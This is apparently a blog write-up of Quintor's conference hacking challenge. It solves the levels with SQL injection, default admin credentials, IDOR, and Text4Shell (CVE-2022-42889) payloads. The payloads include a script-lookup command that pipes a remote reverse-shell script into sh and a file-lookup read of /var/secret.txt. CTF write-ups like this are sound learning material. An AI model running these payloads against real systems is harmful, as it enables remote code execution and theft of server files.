---
title: Quintor H4ck Y0ur Way 1n Challenge Write-up
date: 2023-10-16 09:00:00 +0100
categories: [CTF]
tags: [ctf]     # TAG names should always be lowercase
math: true
---

## Introduction
At Techorama 2023 in Utrecht, the Netherlands, Quintor had an exhibition stand. Representatives of Quintor were giving out leaflets with a challenge description on it, where you're able to win a series of prizes, with the last challenge allowing you to win a Flipper Zero.

The first two challenges were able to be completed on your phone. The third challenge is a bit more difficult, and could be completed at a later time.

The challenge description reads:

> Software development and security go hand in hand these days. But how much do you know about security and hacking?
Take the challenge at [hackyourwayin.quintor.nl](https://hackyourwayin.quintor.nl/), win goodies and have a chance to win the ultimate hacking tool: the Flipper Zero.
Need hints? Visit our exhibition stand, maybe we can help you...

## Challenge 1

![Intro screen](/assets/img/introscreen.jpg){: w="667" h="233" }

After filling in your email address, you are presented with a login screen. The login screen has a single email address field. Below, the basics of SQL injection are explained. The challenge is to bypass the login screen.

Since we're dealing with a simple intro example, I tried the most basic SQL injection: `' OR 1=1 --`. This is a simple SQL injection that will always return true for the expression in the query's `WHERE`-clause, and thus bypass the login screen. This worked, and I was presented the following response.

![Challenge 1](/assets/img/challenge1.JPG){: w="667" h="233" }

Following the link in the response we get the following message

> Congratulations!
You have won a webcam cover!
Pick it up at the Quintor exhibition stand by saying to someone "I want that webcam cover".

## Challenge 2

Challenge 2 is another login screen, but this time with a password field. Below there's a hint referring to [https://owasp.org/Top10/A05_2021-Security_Misconfiguration/](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)

OWASP A05:2021 – Security Misconfiguration is a very broad category. It can be anything from a misconfigured web server to a misconfigured database. In this case, since we're dealing with a login form, I'm assuming a default username and password are used. I tried the following combinations:

| Username | Password   |
| -------- | ---------- |
| admin    | 123456     |
| admin    | quintor    |
| admin    | quintor123 |
| admin    | admin      | 

The last one worked! We're presented with the following view for URL [https://hackyourwayin.quintor.nl/user/1](https://hackyourwayin.quintor.nl/user/1).

![User 1](/assets/img/user1.JPG){: w="667" h="233" }

"IDOR" stands for Insecure Direct Object References. It's a vulnerability where an attacker can access objects (files, directories, database records, etc.) directly, without proper authorization. In our case, we are looking at a user profile with the URL ending with `"/user/1"``. By incrementing the id with +1, we'll maybe get futher.

And indeed, we get the following view for URL [https://hackyourwayin.quintor.nl/user/3](https://hackyourwayin.quintor.nl/user/3).

> Congratulations!
You have won the USB hub!
Pick it up at the Quintor exhibition stand by saying "Gimme the goodies" to someone.
From here it gets less easy. We recommend that you continue on a laptop or desktop via this URL: https://hackyourwayin.quintor.nl/sbom
You can also complete this level at a later time. If you have won a prize, we will contact you via the email address you provided.

## Challenge 3

This page presents you with a search bar, allowing you to search through a SBOM. SBOM stands for Software Bill of Materials. It's a list of all the software components/dependencies used in a project. 

![SBOM](/assets/img/SBOM.jpg){: w="667" h="233" }

The image below is a screenshot of the software [dependency track](https://dependencytrack.org/). Dependency track is a continuous SBOM analysis platform. It allows you to upload a SBOM, and it will check for known vulnerabilities in the software components used in the project.

![Dependency track](/assets/img/dependency-track.png){: w="667" h="233" }

The image shows that specifically `commons-text` version 1.9 from `org.apache.commons` has a vulnerability. A quick Google search reveals that for this version, it must be CVE-2022-42889, also known as *Text4Shell*. 

>This vulnerability is nested in the `StringSubstituor` class of the library, which performs variable interpolation. The standard interpolation format is `${prefix:name}`, where the prefix is a lookup performing interpolation. If the application uses some default lookups, namely `script`, `dns`, or `url`, they are interpolated by default due to a design flaw and allow for remote code execution (RCE) or contact with untrusted remote servers when processing malicious input. 

[Source](https://bell-sw.com/blog/cve-2022-42889-a-critical-vulnerability-in-apache-commons-text-library/)

Additonally, make note of the changed url in the Dependency Track screenshot, pointing us towards `/var/secret.txt`.

The challenge page also contains a 'Result' section, containging a decrypt form asking for a *Cypher text* and a key. 

![Decrypt form](/assets/img/challenge3-result.jpg){: w="667" h="233" }

After doing a bit of reading on the vuulnerability, I tried to get some output from the SBOM search bar. I tried the following payloads:

| Payload | Result |
| -------- | ---------- |
| `${java:version}` | `No dependency found with name: Java version 17.0.8`
| `${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/pwn')}` | `No dependency found with name: Process[pid=19120, exitValue="not exited"]`
| `${script:javascript:7*7}` | `No dependency found with name: 49`
| `${url:UTF-8:https://https://nvid.nist.gov/vuln/detail/CVE-2022-42889}` | HTTP 401 Unauthorized

I initially put a lot of effort into getting a reverse shell working, in order to `cat` /var/secret.txt. However, it seemed that either HTTP 401 Unauthorized or `Process[pid=19120, exitValue="not exited"]` would always be returned. I eventually even employed [Reverse Shell as a Service](https://github.com/lukechilds/reverse-shell), thinking it was a failure in my pipe into `bash` or `sh`.

```javascript
${script:javascript:java.lang.Runtime.getRuntime().exec('curl https://reverse-shell.sh/my.ip:1337 | sh')}
```

After a short while, I decided to take a step back and look into other prefixes for the Apache Commons Text's StringSubstitutor format [here](https://www.dontpanicblog.co.uk/2023/03/11/cve-2022-42889-text4shell/).

Here, I noticed that there is a specific prefix for reading files: `${file:UTF8:`. I, of course, tried the payload `${file:UTF-8:/var/secret.txt}` and got the following response:

![SBOM](/assets/img/SBOM.jpg){: w="667" h="233" }

```
Wynrewtynmrkr, au bmom rv sbiyesewy ahvqvipwy ttxulwaw!
```

After [dJulkalendern 2022](/posts/djulkalendern-2022-write-up/), this is more familiar territory. I employed [CyberChef](https://gchq.github.io/CyberChef/) to attempt a decode, using the *ROT13* recipe, and clicking on the rotation amount to see if I got something comprehensible, but to no avail.

Eventually, after some trial-and-error, the text seems to be encrypted with a Vigenère cipher. I used [dcode.fr](https://www.dcode.fr/vigenere-cipher) to decrypt the text, using the key `quintor`.

The form in the challenge's page already allowed you to decrypt the message using this key. Knowledge about the existence of the Vigenère cipher was not required to complete the challenge.

![Result](/assets/img/challenge3-completed.jpg){: w="667" h="233" }

Translated:
> Congratulations, you have successfully completed the challenge!

This final answer sentence would automatically be filled into the last form where you can send your result to Quintor. I'll eventually update this blogpost when I know if I won the Flipper Zero or not!

## Reflection
Especially the third challenge was a lot of fun. I actually got to learn about a more recent vulnerability in a popular library, and how to exploit it within a safe environment. It's always more fun to actually apply a vulnerability, instead of just reading about it or doing all the required work to set up some docker container from a PoC repository on GitHub.

What really threw me off is that, in the upper-right corner in the screenshot of Dependency Track, showed there were 2 vulnerabilities. Since only some components out of 109 were visible, I was also looking for other vulnerable packages, like the `log4j-core` or `log4j-api` component. While one of these were present, the version wasn't vulnerable. I'm curious as to what the other vulnerability is, but I'm not sure if I'll ever find out.

Overall, I don't have a lot of experience with operations and security, so I'm glad I got to learn a bit more about the existence of this vulnerability, Dependency Track, and some terminology like *SBOM* and *IDOR*. 

